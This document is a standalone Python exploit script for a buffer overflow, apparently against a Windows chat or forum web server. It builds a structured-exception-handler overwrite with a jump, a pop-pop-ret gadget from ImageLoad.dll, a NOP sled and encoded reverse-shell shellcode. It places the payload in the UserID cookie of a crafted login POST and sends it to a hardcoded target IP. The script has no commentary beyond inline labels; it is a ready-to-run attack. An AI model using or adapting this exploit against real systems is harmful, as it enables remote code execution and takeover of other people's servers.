#!/usr/bin/python

import socket
import os
import sys
import struct

ip = "192.168.100.120"
port = 80

revshell =  b""
revshell += b"\xd9\xca\xbb\xa6\x95\xa5\xc1\xd9\x74\x24\xf4\x5d"
revshell += b"\x31\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x13\x03\xfb"
revshell += b"\x86\x47\x34\xff\x41\x05\xb7\xff\x91\x6a\x31\x1a"
revshell += b"\xa0\xaa\x25\x6f\x93\x1a\x2d\x3d\x18\xd0\x63\xd5"
revshell += b"\xab\x94\xab\xda\x1c\x12\x8a\xd5\x9d\x0f\xee\x74"
revshell += b"\x1e\x52\x23\x56\x1f\x9d\x36\x97\x58\xc0\xbb\xc5"
revshell += b"\x31\x8e\x6e\xf9\x36\xda\xb2\x72\x04\xca\xb2\x67"
revshell += b"\xdd\xed\x93\x36\x55\xb4\x33\xb9\xba\xcc\x7d\xa1"
revshell += b"\xdf\xe9\x34\x5a\x2b\x85\xc6\x8a\x65\x66\x64\xf3"
revshell += b"\x49\x95\x74\x34\x6d\x46\x03\x4c\x8d\xfb\x14\x8b"
revshell += b"\xef\x27\x90\x0f\x57\xa3\x02\xeb\x69\x60\xd4\x78"
revshell += b"\x65\xcd\x92\x26\x6a\xd0\x77\x5d\x96\x59\x76\xb1"
revshell += b"\x1e\x19\x5d\x15\x7a\xf9\xfc\x0c\x26\xac\x01\x4e"
revshell += b"\x89\x11\xa4\x05\x24\x45\xd5\x44\x21\xaa\xd4\x76"
revshell += b"\xb1\xa4\x6f\x05\x83\x6b\xc4\x81\xaf\xe4\xc2\x56"
revshell += b"\xcf\xde\xb3\xc8\x2e\xe1\xc3\xc1\xf4\xb5\x93\x79"
revshell += b"\xdc\xb5\x7f\x79\xe1\x63\x2f\x29\x4d\xdc\x90\x99"
revshell += b"\x2d\x8c\x78\xf3\xa1\xf3\x99\xfc\x6b\x9c\x30\x07"
revshell += b"\xfc\x63\x6c\x63\x89\x0b\x6f\x6b\x60\x90\xe6\x8d"
revshell += b"\xe8\x38\xaf\x06\x85\xa1\xea\xdc\x34\x2d\x21\x99"
revshell += b"\x77\xa5\xc6\x5e\x39\x4e\xa2\x4c\xae\xbe\xf9\x2e"
revshell += b"\x79\xc0\xd7\x46\xe5\x53\xbc\x96\x60\x48\x6b\xc1"
revshell += b"\x25\xbe\x62\x87\xdb\x99\xdc\xb5\x21\x7f\x26\x7d"
revshell += b"\xfe\xbc\xa9\x7c\x73\xf8\x8d\x6e\x4d\x01\x8a\xda"
revshell += b"\x01\x54\x44\xb4\xe7\x0e\x26\x6e\xbe\xfd\xe0\xe6"
revshell += b"\x47\xce\x32\x70\x48\x1b\xc5\x9c\xf9\xf2\x90\xa3"
revshell += b"\x36\x93\x14\xdc\x2a\x03\xda\x37\xef\x23\x39\x9d"
revshell += b"\x1a\xcc\xe4\x74\xa7\x91\x16\xa3\xe4\xaf\x94\x41"
revshell += b"\x95\x4b\x84\x20\x90\x10\x02\xd9\xe8\x09\xe7\xdd"
revshell += b"\x5f\x29\x22"

nSEH = "\xEB\x06\x90\x90"            # Jump to D buffer
SEH  = struct.pack("<I", 0x100103fe) # ppr - ImageLoad.dll

crash  = "A" * 4059
crash += nSEH
crash += SEH
crash += "\x90" * 30
crash += revshell
crash += "D" * (10617 - len(crash))

req  = "POST /forum.ghp HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/login.htm\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: 67\r\n"
req += "Connection: close\r\n"
req += "Cookie: UserID=" + crash + "; PassWD=Andreee; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201; SESSIONID=-1\r\nUpgrade-Insecure-Requests: 1\r\n\r\nfrmLogin=true&frmUserName=SKreee&frmUserPass=Andreee&login=Login%21&"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

